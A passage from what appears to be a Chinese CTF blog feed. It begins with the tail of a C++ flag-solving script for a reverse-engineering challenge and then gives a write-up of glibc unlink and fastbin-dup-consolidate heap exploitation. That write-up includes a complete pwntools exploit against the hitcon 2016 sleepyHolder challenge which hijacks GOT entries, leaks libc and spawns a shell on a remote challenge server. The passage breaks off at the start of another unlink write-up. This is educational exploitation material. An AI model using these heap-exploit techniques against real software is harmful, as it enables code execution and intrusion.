class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;ida.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;x86intrin.h&gt;</span></span><br><br><br><span class="hljs-keyword">static</span> uint64  fs_0;<br><span class="hljs-function">uint64 <span class="hljs-title">getFS0</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// v7[0] = 8461816625668189699LL * v7[0] + 841540768324766462LL;</span><br>    fs_0 = <span class="hljs-number">0x756E69636F726E03</span> * fs_0 + <span class="hljs-number">0xBADC0DEC001CAFE</span>;<br>    <span class="hljs-keyword">return</span> fs_0;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setFSO</span><span class="hljs-params">(<span class="hljs-keyword">int64_t</span> val)</span> </span>&#123;<br>    fs_0 = val;<br>&#125;<br><br><span class="hljs-function">uint64 <span class="hljs-title">test_time</span><span class="hljs-params">(uint64 time)</span> </span>&#123;<br>    uint64  v35;<br>    setFSO(<span class="hljs-number">0x7177625F32303231</span>);<br><br>    uint64 v2 = time ;<br>    uint64  data0 = time ;<br>    uint64 d1, d2,v62, v60;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i != <span class="hljs-number">256</span>; ++i )<br>    &#123;<br>        d1 = <span class="hljs-number">0</span>;<br>        d1 = getFS0();<br>        v62 = d1;<br>        d2 = getFS0();<br>        v60 = d2;<br>        data0 = __ROL8__((data0 ^ d1) + d2 + <span class="hljs-number">33</span> * data0 + <span class="hljs-number">1</span>, <span class="hljs-number">13</span>);<br>        <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>            data0 = v60 ^ (v62 + data0);<br>        <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span> )<br>            data0 ^= v62 + v60;<br>        <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">4</span>) != <span class="hljs-number">0</span> )<br>            data0 ^= v60 ^ v62;<br>        v2 = i &amp; <span class="hljs-number">8</span>;<br>        <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">8</span>) != <span class="hljs-number">0</span> )<br>        &#123;<br>            v2 = data0 + v62 + v60;<br>            data0 = v2;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p ==\n&quot;</span>, data0);<br>    <span class="hljs-keyword">return</span> data0;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Hello, World!&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">unsigned</span> __int64 compare[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">unsigned</span> __int64 xorKey[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags[] = &#123;<span class="hljs-number">0x67616c66</span>, <span class="hljs-number">0x47414c46</span>, <span class="hljs-number">0x7b627771</span>, <span class="hljs-number">0x7b425751</span>&#125;;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> xorkey0[<span class="hljs-number">32</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    uint32  * xorkey0_4 = (uint32  *)xorkey0;<br>    compare[<span class="hljs-number">0</span>] = <span class="hljs-number">0x3EC81D9432CEF584</span>; <span class="hljs-comment">// flag, FLAG, qwb&#123; ,QWB&#123;</span><br>    compare[<span class="hljs-number">1</span>] = <span class="hljs-number">0xB649A4DCD6BD24FE</span>;<br>    compare[<span class="hljs-number">2</span>] = <span class="hljs-number">0xC5927F0B767A787D</span>;<br>    compare[<span class="hljs-number">3</span>] = <span class="hljs-number">0x1F245B7F751BB52E</span>;<br>    xorKey[<span class="hljs-number">0</span>] = <span class="hljs-number">0x178DEC4F232DDB6E</span>;<br>    xorKey[<span class="hljs-number">1</span>] = <span class="hljs-number">0xC2AAB7D6D2A167C3</span>;<br>    xorKey[<span class="hljs-number">2</span>] = <span class="hljs-number">0xF1AB91F72761A80F</span>;<br>    xorKey[<span class="hljs-number">3</span>] = <span class="hljs-number">0x3DCEDC28076C41A</span>;<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> * compare_4 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)compare;<br><br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> fs;<br>    uint64 v35, v36, v33,v32, v31, v30;<br>    setFSO(<span class="hljs-number">0x5249415452455451</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i_0 = <span class="hljs-number">0</span>; <span class="hljs-number">32</span> != i_0; ++i_0 )<br>    &#123;<br>        uint64 data0 = getFS0();               <span class="hljs-comment">// 0x5249415452455451</span><br>        v35 = i_0;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>; m != <span class="hljs-number">256</span>; ++m )<br>        &#123;<br>            uint64 data1 = getFS0();<br>            uint64 data2 = getFS0();<br>            v35 = (v35 ^ data1) + data2 + <span class="hljs-number">0x21</span> * v35 + <span class="hljs-number">1</span>;<br><br>            v35 = __ROL8__(v35, <span class="hljs-number">13</span>);<br>            <span class="hljs-keyword">if</span> ( (m &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>                v35 = data2 ^ (data1 + v35);<br>            <span class="hljs-keyword">if</span> ( (m &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span> )<br>                v35 ^= data2 + data1;<br>            <span class="hljs-keyword">if</span> ( (m &amp; <span class="hljs-number">4</span>) != <span class="hljs-number">0</span> )<br>                v35 ^= data2 ^ data1;<br>            <span class="hljs-keyword">if</span> ( (m &amp; <span class="hljs-number">8</span>) != <span class="hljs-number">0</span> )<br>                v35 += data2 + data1;<br>        &#125;<br>        xorkey0[i_0] =  (_BYTE)data0 + (_BYTE)v35;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span>; k++) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> * data = (<span class="hljs-keyword">unsigned</span>  <span class="hljs-keyword">char</span> *)&amp;flags[k];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>            data[i] ^= xorkey0[i];<br>        &#125;<br>       <span class="hljs-comment">// printf(&quot;%x\n&quot;, flags[k]);</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> ii = <span class="hljs-number">0</span>; <span class="hljs-number">32</span> != ii; ++ii )<br>        *((_BYTE *)compare + ii) ^= *((_BYTE *)xorKey + ii);<br><br><br>    uint64 targetTT = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>    &#123;<br>        <span class="hljs-comment">// v27 = from_t0 + _mm_crc32_u32(0, v27);</span><br>      <span class="hljs-comment">//  unsigned int from_t0 = compare_4[0] - _mm_crc32_u32(0, flags[i]);</span><br>        uint64 tt = compare_4[<span class="hljs-number">0</span>] - _mm_crc32_u32(<span class="hljs-number">0</span>, flags[i]);<br>        uint64 rr = test_time(tt);<br>        <span class="hljs-keyword">if</span> (rr == <span class="hljs-number">0x1c986c3b22ea63e5</span>) &#123;<br>            targetTT = tt;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;val:%p\n&quot;</span>, tt);<br>        &#125;<br>    &#125;<br><br>    uint32 flag_arr[<span class="hljs-number">8</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; ++i) &#123; <span class="hljs-comment">// 4 * 8</span><br>        <span class="hljs-keyword">for</span> (uint32 val = <span class="hljs-number">0</span>; val != <span class="hljs-number">0xffffffff</span>; ++val) &#123;<br>            <span class="hljs-keyword">if</span> (compare_4[i] - targetTT == _mm_crc32_u32(<span class="hljs-number">0</span>, val)) &#123;<br>                flag_arr[i] = val;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; ++i) &#123;<br>        flag_arr[i] ^= xorkey0_4[i];<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, (<span class="hljs-keyword">char</span> *)flag_arr);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>Capstone</tag>
      
      <tag>Unicorn</tag>
      
      <tag>Keystone</tag>
      
      <tag>Recompile</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Unlink 与 fastbin dup consolidate 利用</title>
    <link href="/2021/06/11/Unlink-%E4%B8%8E-fastbin-dup-consolidate-%E5%88%A9%E7%94%A8/"/>
    <url>/2021/06/11/Unlink-%E4%B8%8E-fastbin-dup-consolidate-%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Unlink-与-fastbin-dup-consolidate-利用"><a href="#Unlink-与-fastbin-dup-consolidate-利用" class="headerlink" title="Unlink 与 fastbin dup consolidate 利用"></a>Unlink 与 fastbin dup consolidate 利用</h1><p>malloc 在分配 large chunk 的时候，会调用 <code>malloc_consolidate</code> 函数。</p><p><code>malloc_consolidate</code> 函数将 fastbin 中的 chunk 与相邻 free chunk 合并，合并后放入 unsorted bin。</p><p>若 chunk 的 next chunk 不是 free chunk，则清除 next chunk 的 size 的 INUSE 标志位。</p><p>可以利用 malloc_consolidate 清理 next chunk size 标志位的性质构造 unlink</p><p>unlink 最主要的思路就是想办法清除掉 INUSE 标志位，构造向后（低地址）unlink 的机会</p><p>unlink fast bin dup consolidate 利用条件：</p><ol><li>存在多次释放漏洞</li><li>可以分配 large chunk</li></ol><h2 id="sleepyHolder-hitcon-2016"><a href="#sleepyHolder-hitcon-2016" class="headerlink" title="sleepyHolder_hitcon_2016"></a>sleepyHolder_hitcon_2016</h2><p>这是一道简单的 unlink 题，只能创建三种类型固定大小的 chunk</p><ol><li>small secret: 40 字节 (fastbin)</li><li>big secret:  4000 字节</li><li>huge secret: 400000 字节</li></ol><p>其中 huge secret 只能在申请的时候改写，不能再次修改和释放，只能利用 huge secret 来触发 malloc_consolidate</p><p>有三种操作:</p><ol><li>Wipe: 释放 small/big</li><li>Renew: 修改 small/big secret</li><li>Keep:申请 small/big/huge , (huge 只能申请一次)</li></ol><p>unlink 操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># unlink</span><br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\x11&#x27;</span> * <span class="hljs-number">0x28</span>) <span class="hljs-comment"># small secret</span><br>keep(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;\x22&#x27;</span> * <span class="hljs-number">0x28</span>) <span class="hljs-comment"># big secret</span><br><span class="hljs-comment"># 此时 small 与 big 对应的 chunk 相邻</span><br>wipe(<span class="hljs-number">1</span>) <span class="hljs-comment"># fastbin -&gt; small secret</span><br><br><span class="hljs-comment">#  big 对应的 chunk-&gt;size inuse 设置为 0</span><br><span class="hljs-comment">#  fastbin 被清空</span><br>keep(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;\x33&#x27;</span> * <span class="hljs-number">0x28</span>) <span class="hljs-comment"># malloc_consolidate</span><br><br><br><span class="hljs-comment"># 将 small bin 再次放入 fastbin</span><br>wipe(<span class="hljs-number">1</span>)  <span class="hljs-comment"># fastbin -&gt; small secret</span><br><br><span class="hljs-comment"># 申请 small secret 再次得到 small secret 控制权</span><br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;\x44&#x27;</span> * <span class="hljs-number">0x28</span>)<br><br><span class="hljs-comment"># 在 small 中构造 fake chunk</span><br>target = <span class="hljs-number">0x6020D0</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(target - <span class="hljs-number">0x18</span>) + p64(target - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x20</span>)<br>renew(<span class="hljs-number">1</span>, fake_chunk)<br><br><span class="hljs-comment"># 释放 big，由于 big 对应 chunk-&gt;prev_size INUSE 为 0，则 unlink</span><br>wipe(<span class="hljs-number">2</span>) <span class="hljs-comment"># unlink</span><br></code></pre></td></tr></table></figure><p>unlink 操作后 target = 0x6020D0 (存 small 地址的变量) 的值被修改为 0x6020D0 - 0x18，调用 renew 可控如下所有地址区间</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020B8</span> <span class="hljs-selector-tag">qword_6020B8</span>    <span class="hljs-selector-tag">dq</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">sub_4008F0</span>↑<span class="hljs-selector-tag">r</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020B8</span>                                         ; <span class="hljs-selector-tag">sub_4008F0</span>+13↑<span class="hljs-selector-tag">w</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C0</span> ; <span class="hljs-selector-tag">void</span> *<span class="hljs-selector-tag">big_ptr</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C0</span> <span class="hljs-selector-tag">big_ptr</span>         <span class="hljs-selector-tag">dq</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span>+11<span class="hljs-selector-tag">E</span>↑<span class="hljs-selector-tag">w</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C0</span>                                         ; <span class="hljs-selector-tag">Keep</span>+139↑<span class="hljs-selector-tag">r</span> ...<br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C8</span> ; <span class="hljs-selector-tag">void</span> *<span class="hljs-selector-tag">huge_ptr</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C8</span> <span class="hljs-selector-tag">huge_ptr</span>        <span class="hljs-selector-tag">dq</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span>+174↑<span class="hljs-selector-tag">w</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C8</span>                                         ; <span class="hljs-selector-tag">Keep</span>+18<span class="hljs-selector-tag">F</span>↑<span class="hljs-selector-tag">r</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020D0</span> ; <span class="hljs-selector-tag">void</span> *<span class="hljs-selector-tag">small_ptr</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020D0</span> <span class="hljs-selector-tag">small_ptr</span>       <span class="hljs-selector-tag">dq</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span>+<span class="hljs-selector-tag">C2</span>↑<span class="hljs-selector-tag">w</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020D0</span>                                         ; <span class="hljs-selector-tag">Keep</span>+<span class="hljs-selector-tag">DD</span>↑<span class="hljs-selector-tag">r</span> ...<br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020D8</span> <span class="hljs-selector-tag">big</span>             <span class="hljs-selector-tag">dd</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span><span class="hljs-selector-pseudo">:loc_400A3D</span>↑<span class="hljs-selector-tag">r</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020D8</span>                                         ; <span class="hljs-selector-tag">Keep</span>+125↑<span class="hljs-selector-tag">w</span> ...<br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020DC</span> <span class="hljs-selector-tag">huge</span>            <span class="hljs-selector-tag">dd</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span>+35↑<span class="hljs-selector-tag">r</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020DC</span>                                         ; <span class="hljs-selector-tag">Keep</span><span class="hljs-selector-pseudo">:loc_400A96</span>↑<span class="hljs-selector-tag">r</span> ...<br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020E0</span> <span class="hljs-selector-tag">small</span>           <span class="hljs-selector-tag">dd</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span><span class="hljs-selector-pseudo">:loc_4009E1</span>↑<span class="hljs-selector-tag">r</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020E0</span>                                         ; <span class="hljs-selector-tag">Keep</span>+<span class="hljs-selector-tag">C9</span>↑<span class="hljs-selector-tag">w</span> ...<br></code></pre></td></tr></table></figure><p>完整 exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> system<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment">#libc_file_name = &#x27;/home/pandaos/Projects/pwn/glibc/2.23/64/lib/libc-2.23.so&#x27;</span><br>libc_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/libc-2.23.so&#x27;</span><br>ld_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/ld-linux-x86-64.so.2&#x27;</span><br><span class="hljs-comment"># p = process([ld_file_name, &#x27;./sleepyHolder_hitcon_2016&#x27;],</span><br><span class="hljs-comment">#            env = &#123;&quot;LD_PRELOAD&quot;: libc_file_name&#125;)</span><br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="hljs-number">25711</span>)<br>elf = ELF(<span class="hljs-string">&#x27;sleepyHolder_hitcon_2016&#x27;</span>)<br>libc = ELF(libc_file_name)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">keep</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>, content</span>):</span><br>    <span class="hljs-comment"># 1 small</span><br>    <span class="hljs-comment"># 2 Big</span><br>    <span class="hljs-comment"># 3 huge</span><br>    p.recvuntil(<span class="hljs-string">&#x27;3. Renew secret\n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    time.sleep(<span class="hljs-number">0.5</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>))<br>    p.recvuntil(<span class="hljs-string">&#x27;Tell me your secret: \n&#x27;</span>)<br>    p.send(content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">renew</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>, content</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;3. Renew secret\n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Which Secret do you want to renew?\n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>))<br>    p.recvuntil(<span class="hljs-string">&#x27;Tell me your secret: \n&#x27;</span>)<br>    p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wipe</span>(<span class="hljs-params"><span class="hljs-built_in">type</span></span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;3. Renew secret\n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;2. Big secret\n&#x27;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>))<br><br><br><br><span class="hljs-comment"># unlink</span><br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\x11&#x27;</span> * <span class="hljs-number">0x28</span>)<br>keep(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;\x22&#x27;</span> * <span class="hljs-number">0x28</span>)<br>wipe(<span class="hljs-number">1</span>)<br>keep(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;\x33&#x27;</span> * <span class="hljs-number">0x28</span>) <span class="hljs-comment"># small presize clear</span><br>wipe(<span class="hljs-number">1</span>)<br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;\x44&#x27;</span> * <span class="hljs-number">0x28</span>)<br><br>target = <span class="hljs-number">0x6020D0</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(target - <span class="hljs-number">0x18</span>) + p64(target - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x20</span>)<br>renew(<span class="hljs-number">1</span>, fake_chunk)<br>wipe(<span class="hljs-number">2</span>) <span class="hljs-comment"># unlink</span><br><br><span class="hljs-comment"># 0x6020D0-0x18 内存可写</span><br>                   <span class="hljs-comment"># big_ptr              # huge_ptr</span><br>payload = p64(<span class="hljs-number">0</span>) + p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(<span class="hljs-number">0x00000000006020b8</span>) + p64(<span class="hljs-number">1</span>) * <span class="hljs-number">3</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">2</span>, p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>payload = p64(<span class="hljs-number">0</span>) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(<span class="hljs-number">0x00000000006020b8</span>) + p64(<span class="hljs-number">1</span>) * <span class="hljs-number">3</span><br>renew(<span class="hljs-number">1</span>, payload)<br>wipe(<span class="hljs-number">2</span>)<br><br>leak_puts = u64(p.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>libc_base = leak_puts - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br><br>payload = p64(<span class="hljs-number">0</span>) + p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(bin_sh) + p64(<span class="hljs-number">1</span>) * <span class="hljs-number">3</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">2</span>, p64(system))<br>wipe(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># input(&quot;&gt;&gt;&quot;)</span><br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>heap</tag>
      
      <tag>fastbin</tag>
      
      <tag>unlink</tag>
      
      <tag>fastbin_dup_consolidate</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unlink</title>
    <link href="/2021/06/11/unlink/"/>
    <url>/2021/06/11/unlink/</url>
    
    <content type="html"><![CDATA[<h1 id="Unlink-攻击"><a href="#Unlink-攻击" class="headerlink" title="Unlink 攻击"></a>Unlink 攻击</h1><p>Unlink 也是一种很常见的堆溢出利用手段</p><p>我认为 unlink 攻击的本质是利用 free 中 unlink 操作修改指向堆块的指针变量 p，使其指向 p-3 处，修改 p[3] 即可修改 p 自身，从而达到任意地址读写的能力。</p><p>利用条件：</p><ol><li>指针变量 p 指向堆分配的地址，且对该地址可读可写</li><li>p 指向的 chunk 的前一个 chunk 可溢出到下一个 chunk 的 size 域</li><li>p 指向的 chunk 的前一个 chunk 大小足够构造 fake chunk</li><li>满足 free unlink 条件</li></ol><p>只要满足上述条件，并合理的在 p 指向 chunk 的物理前一个 chunk 中构造 fake chunk，再调用 free(p) 即可触发 unlink</p><p>p 指向 fake_chunk</p><p>fake chunk 构造如下</p><table><thead><tr><th>pre_size</th><th>0</th></tr></thead><tbody><tr><td>size</td><td>xxxx</td></tr><tr><td>fd</td><td>&amp;p - 0x18</td></tr><tr><td>bk</td><td>&amp;p - 0x10</td></tr></tbody></table><p>unlink 是模版化的题，每次按照这个表填即可。</p><h2 id="hitcon2014-stkof"><a href="#hitcon2014-stkof" class="headerlink" title="hitcon2014_stkof"></a>hitcon2014_stkof</h2><p>非常简单的 unlink 题，该题在 bss 段保存了一张指针表，每一项都指向 malloc 出来的内存，并且对指向的内存有任意读写的能力，且能溢出写。</p><p>只需要让 p 指向该指针表的某项，并构造 fake chunk ，unlink 之后指针表可控。</p><p>指针表可控后，填入 strlen got 表地址，修改 strlen got 为 puts，泄漏 libc 地址</p><p>再次修改 strlen 为 system ，getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 